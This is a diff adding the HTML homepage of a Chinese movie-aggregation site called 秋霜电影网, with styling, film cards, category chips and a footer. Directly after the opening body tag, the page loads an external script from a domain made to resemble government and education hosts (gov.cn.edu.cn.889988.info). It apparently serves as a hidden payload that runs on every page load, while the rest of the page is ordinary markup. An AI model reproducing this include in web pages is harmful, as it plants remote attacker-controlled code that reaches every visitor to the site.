@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="秋霜电影网,qiushuangdianyingwang,秋霜影视,在线电影,高清电影,免费影视">
+<meta name="description" content="秋霜电影网 - 如秋霜般清爽的影视体验，秋高气爽看大片，电影电视剧综艺动漫纪录片一站尽享。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>秋霜电影网 | 秋高气爽 · 看尽好片</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#f5f7fa;color:#1e293b;line-height:1.65;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+:root{--pri:#0ea5e9;--deep:#0369a1;--ink:#0f172a;--gray:#64748b;--line:#e2e8f0;--frost:#e0f2fe;--frost2:#f0f9ff}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+
+/* nav */
+nav.top{background:rgba(255,255,255,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+nav.top .wrap{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{display:flex;align-items:center;gap:11px}
+.logo .fl{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--pri),#38bdf8);color:#fff;font-weight:900;font-size:13px;display:flex;align-items:center;justify-content:center;text-align:center;line-height:1.1}
+.logo b{font-size:17px;font-weight:900;letter-spacing:.5px}
+.logo small{display:block;font-size:9px;color:var(--gray)}
+.tabs{display:none;gap:4px}
+.tabs a{padding:8px 16px;border-radius:10px;font-size:14px;font-weight:700;color:var(--gray);transition:.2s}
+.tabs a:hover,.tabs a.act{background:var(--frost);color:var(--pri)}
+.mbtn{width:42px;height:42px;border-radius:11px;border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:19px;cursor:pointer;background:#fff}
+.panel{display:none;background:#fff;padding:8px 16px;border-bottom:1px solid var(--line)}
+.panel.on{display:block}
+.panel a{display:block;padding:14px 0;border-bottom:1px solid var(--line);font-weight:700}
+.panel a:last-child{border:none}
+
+/* hero - split */
+.hero{background:linear-gradient(135deg,#0c4a6e 0%,#075985 45%,#0369a1 100%);color:#fff;padding:52px 0 60px;position:relative;overflow:hidden}
+.hero::after{content:"❄";position:absolute;right:-20px;top:-30px;font-size:200px;color:rgba(255,255,255,.05)}
+.hero .wrap{position:relative;z-index:2;text-align:center}
+.hero .pill{display:inline-block;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.3);padding:6px 18px;border-radius:30px;font-size:12px;font-weight:800;margin-bottom:18px;backdrop-filter:blur(4px)}
+.hero h1{font-size:30px;font-weight:900;line-height:1.45;margin-bottom:14px;text-shadow:0 2px 12px rgba(0,0,0,.2)}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#7dd3fc,#bae6fd);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:13px;color:#bae6fd;max-width:520px;margin:0 auto 26px}
+.search{background:#fff;border-radius:14px;padding:6px;display:flex;gap:6px;max-width:520px;margin:0 auto;box-shadow:0 12px 30px rgba(0,0,0,.18)}
+.search input{flex:1;border:none;outline:none;padding:12px 14px;font-size:14px;color:var(--ink);min-width:0}
+.search button{background:var(--pri);color:#fff;border:none;padding:0 24px;border-radius:10px;font-weight:900;cursor:pointer;font-size:14px;flex-shrink:0}
+.tags{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:22px}
+.tags a{background:rgba(255,255,255,.12);color:#e0f2fe;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;border:1px solid rgba(255,255,255,.15)}
+.tags a:hover{background:#fff;color:var(--deep)}
+
+/* section */
+.sec{padding:46px 0}
+.hd{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-bottom:24px}
+.hd h2{font-size:22px;font-weight:900}
+.hd h2 span{display:block;font-size:11px;color:var(--gray);font-weight:600;margin-top:3px}
+.hd a{font-size:12px;color:var(--pri);font-weight:800;white-space:nowrap}
+
+/* film cover grid with overlay */
+.fgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fcard{position:relative;border-radius:14px;overflow:hidden;background:#cbd5e1;aspect-ratio:2/3;cursor:pointer}
+.fcard .post{position:absolute;inset:0;background:linear-gradient(160deg,var(--g1,var(--pri)),var(--g2,#6366f1));opacity:.95}
+.fcard .mid{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:34px;color:rgba(255,255,255,.85)}
+.fcard .meta{position:absolute;left:0;right:0;bottom:0;padding:24px 12px 12px;background:linear-gradient(to top,rgba(15,23,42,.95),transparent);color:#fff}
+.fcard .meta b{display:block;font-size:14px;font-weight:900;margin-bottom:3px}
+.fcard .meta i{font-style:normal;font-size:11px;color:#cbd5e1}
+.fcard .tag{position:absolute;top:10px;left:10px;background:rgba(255,255,255,.92);color:var(--deep);font-size:10px;font-weight:900;padding:3px 8px;border-radius:6px}
+
+/* type list horizontal */
+.tlist{display:flex;gap:12px;overflow-x:auto;padding-bottom:8px;scrollbar-width:none}
+.tlist::-webkit-scrollbar{display:none}
+.tchip{flex:0 0 auto;background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px;min-width:150px;text-align:center;transition:.2s}
+.tchip:hover{border-color:var(--pri);background:var(--frost2);transform:translateY(-2px)}
+.tchip .ic{font-size:28px;display:block;margin-bottom:8px}
+.tchip b{display:block;font-size:14px;font-weight:900;margin-bottom:3px}
+.tchip span{font-size:11px;color:var(--gray)}
+
+/* about split panel */
+.aboutbox{background:#fff;border:1px solid var(--line);border-radius:20px;padding:26px;display:grid;grid-template-columns:1fr;gap:20px}
+.aboutbox .lead{background:var(--frost);border-radius:14px;padding:22px}
+.aboutbox .lead h3{font-size:19px;font-weight:900;color:var(--deep);margin-bottom:10px}
+.aboutbox .lead p{font-size:13px;color:var(--gray);line-height:1.9}
+.aboutbox ul{list-style:none;display:grid;gap:12px}
+.aboutbox li{display:flex;gap:12px;align-items:flex-start}
+.aboutbox li .n{width:26px;height:26px;border-radius:8px;background:var(--pri);color:#fff;font-size:12px;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.aboutbox li b{display:block;font-size:14px;font-weight:900}
+.aboutbox li span{font-size:12px;color:var(--gray)}
+
+/* footer */
+footer{background:var(--ink);color:#fff;padding:42px 0 28px}
+footer .wrap{text-align:center}
+footer .lg{font-size:19px;font-weight:900;margin-bottom:6px}
+footer .url{color:#7dd3fc;font-weight:700;font-size:13px;margin-bottom:20px;word-break:break-all}
+footer .lk{display:flex;gap:20px;justify-content:center;flex-wrap:wrap;margin-bottom:24px}
+footer .lk a{font-size:13px;color:#94a3b8;font-weight:600}
+footer .lk a:hover{color:#7dd3fc}
+footer p{font-size:11px;color:#64748b;margin-bottom:5px}
+
+#top{position:fixed;right:16px;bottom:22px;z-index:90;width:46px;height:46px;border-radius:15px;background:var(--pri);color:#fff;font-weight:900;display:none;align-items:center;justify-content:center;font-size:18px;cursor:pointer;box-shadow:0 6px 18px rgba(14,165,233,.4)}
+#top.on{display:flex}
+
+@media(min-width:640px){.fgrid{grid-template-columns:repeat(3,1fr)}.aboutbox{grid-template-columns:1fr 1fr}}
+@media(min-width:900px){
+ .tabs{display:flex}.mbtn{display:none}
+ .hero h1{font-size:46px}
+ .fgrid{grid-template-columns:repeat(6,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Nav -->
+<nav class="top">
+  <div class="wrap">
+    <div class="logo">
+      <div class="fl">秋霜<br>电影</div>
+      <div><b>秋霜电影网</b><small>QIUSHUANG DIANYING</small></div>
+    </div>
+    <div class="tabs">
+      <a href="#home" class="act">首页</a>
+      <a href="#new">最新上线</a>
+      <a href="#type">影片分类</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="mbtn" onclick="document.getElementById('pn').classList.toggle('on')">☰</div>
+  </div>
+  <div class="panel" id="pn">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#new" onclick="this.parentNode.classList.remove('on')">最新上线</a>
+    <a href="#type" onclick="this.parentNode.classList.remove('on')">影片分类</a>
+    <a href="#about" onclick="this.parentNode.classList.remove('on')">关于我们</a>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="pill">❄ 秋高气爽 · 好片正当时</div>
+    <h1>秋霜电影网 · <em>清爽观影</em> 每一天</h1>
+    <p>汇聚电影、电视剧、综艺、动漫、纪录片等海量影视资源，高清流畅，随时随地开启观影之旅。</p>
+    <div class="search">
+      <input type="text" placeholder="搜索影片 / 演员 / 类型…">
+      <button>搜索</button>
+    </div>
+    <div class="tags">
+      <a href="#">热播榜</a>
+      <a href="#">高分榜</a>
+      <a href="#">新片速递</a>
+      <a href="#">经典老片</a>
+      <a href="#">更多 ›</a>
+    </div>
+  </div>
+</section>
+
+<!-- New films -->
+<section class="sec" id="new">
+  <div class="wrap">
+    <div class="hd"><h2>最新上线<span>NEW · 每日精选更新</span></h2><a href="#">全部 ›</a></div>
+    <div class="fgrid">
+      <a href="#" class="fcard" style="--g1:#0284c7;--g2:#6366f1"><div class="post"></div><div class="mid">🎬</div><div class="tag">更新</div><div class="meta"><b>星际回响</b><i>科幻 · 2025</i></div></a>
+      <a href="#" class="fcard" style="--g1:#0891b2;--g2:#0d9488"><div class="post"></div><div class="mid">🎭</div><div class="tag">热播</div><div class="meta"><b>长安十二时辰</b><i>古装 · 悬疑</i></div></a>
+      <a href="#" class="fcard" style="--g1:#2563eb;--g2:#7c3aed"><div class="post"></div><div class="mid">💖</div><div class="tag">推荐</div><div class="meta"><b>遇见你的声音</b><i>爱情 · 青春</i></div></a>
+      <a href="#" class="fcard" style="--g1:#0284c7;--g2:#0e7490"><div class="post"></div><div class="mid">🔥</div><div class="tag">热播</div><div class="meta"><b>烈焰特工</b><i>动作 · 犯罪</i></div></a>
+      <a href="#" class="fcard" style="--g1:#0ea5e9;--g2:#2563eb"><div class="post"></div><div class="mid">😂</div><div class="tag">推荐</div><div class="meta"><b>欢乐一家人</b><i>喜剧 · 家庭</i></div></a>
+      <a href="#" class="fcard" style="--g1:#0369a1;--g2:#4338ca"><div class="post"></div><div class="mid">🎪</div><div class="tag">更新</div><div class="meta"><b>奇幻森林</b><i>动画 · 冒险</i></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- Type chips -->
+<section class="sec" id="type" style="padding-top:0">
+  <div class="wrap">
+    <div class="hd"><h2>影片分类<span>按类型 · 按地区 · 随心选</span></h2><a href="#">全部 ›</a></div>
+    <div class="tlist">
+      <a href="#" class="tchip"><span class="ic">🎬</span><b>动作</b><span>2560 部</span></a>
+      <a href="#" class="tchip"><span class="ic">😂</span><b>喜剧</b><span>1980 部</span></a>
+      <a href="#" class="tchip"><span class="ic">💖</span><b>爱情</b><span>1740 部</span></a>
+      <a href="#" class="tchip"><span class="ic">🔍</span><b>悬疑</b><span>1320 部</span></a>
+      <a href="#" class="tchip"><span class="ic">👽</span><b>科幻</b><span>960 部</span></a>
+      <a href="#" class="tchip"><span class="ic">⚔️</span><b>古装</b><span>1120 部</span></a>
+      <a href="#" class="tchip"><span class="ic">🎪</span><b>动画</b><span>850 部</span></a>
+      <a href="#" class="tchip"><span class="ic">🌿</span><b>纪录</b><span>640 部</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section class="sec" id="about" style="padding-top:0">
+  <div class="wrap">
+    <div class="hd"><h2>关于本站<span>ABOUT · 清爽观影从这里开始</span></h2><a href="#">联系 ›</a></div>
+    <div class="aboutbox">
+      <div class="lead">
+        <h3>为什么选择秋霜电影网？</h3>
+        <p>如秋霜般清爽纯粹的观影体验，无繁杂干扰，专注好内容。我们持续聚合全网优质影视资源，用心整理分类，让每一次打开都有惊喜。</p>
+      </div>
+      <ul>
+        <li><div class="n">1</div><div><b>资源海量</b><span>多类型多地区，持续更新</span></div></li>
+        <li><div class="n">2</div><div><b>高清流畅</b><span>多清晰度，加载迅速</span></div></li>
+        <li><div class="n">3</div><div><b>清爽界面</b><span>简洁易用，专注内容</span></div></li>
+        <li><div class="n">4</div><div><b>多端适配</b><span>手机电脑全兼容</span></div></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="wrap">
+    <div class="lg">秋霜电影网</div>
+    <div class="url">https://qiushuangdianyingwang-wap.github.io</div>
+    <div class="lk">
+      <a href="#">首页</a>
+      <a href="#">最新上线</a>
+      <a href="#">影片分类</a>
+      <a href="#">关于我们</a>
+      <a href="#">意见反馈</a>
+    </div>
+    <p>© 2026 秋霜电影网 qiushuangdianyingwang · 保留所有权利</p>
+    <p>本站仅提供影视信息聚合服务，请支持正版</p>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>400);});
+</script>
+</body>
+</html>
